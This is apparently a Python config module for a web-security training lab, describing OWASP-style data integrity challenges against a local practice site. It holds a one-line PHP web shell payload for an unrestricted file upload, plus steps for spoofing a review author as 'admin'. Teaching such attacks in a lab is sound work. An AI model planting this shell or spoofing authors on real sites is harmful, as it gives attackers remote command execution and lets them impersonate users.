"""A08:2025 — Data Integrity Failures — VulnSite Challenges"""
SECTION = {
    "id": "a08", "name": "A08:2025 — Data Integrity Failures",
    "theory": "Data Integrity: file upload with no validation, author spoofing in reviews,\nclient-side validation bypass.\n\n🎯 TARGET: ShopSim VulnSite at http://localhost:8080",
    "stages": [
        {"name": "Unrestricted File Upload", "min_difficulty": "easy", "techniques": [
            {"id": "di_1", "description": "Upload a PHP/Python shell via the file upload page.", "target_page": "/upload",
             "payload": "shell.php", "hint": "In Easy mode, there's no file type restriction.",
             "steps_easy": ["Go to /upload", "Create a file called shell.php with: <?php system($_GET['cmd']); ?>",
                 "Upload it — no file type check in Easy mode!"]},
        ]},
        {"name": "Review Author Spoofing", "min_difficulty": "normal", "techniques": [
            {"id": "di_2", "description": "Post a product review as another user by changing the author field.", "target_page": "/product/1",
             "payload": "Change the author input field to 'admin'", "hint": "The author field is editable in easy/normal mode.",
             "steps_easy": ["Login, go to /product/1", "In the review form, change the Author name to 'admin'",
                 "Submit — the review appears as if admin wrote it"]},
        ]},
    ],
    "external_labs": {"free": [("PortSwigger — File Upload", "https://portswigger.net/web-security/file-upload")], "paid": []},
}
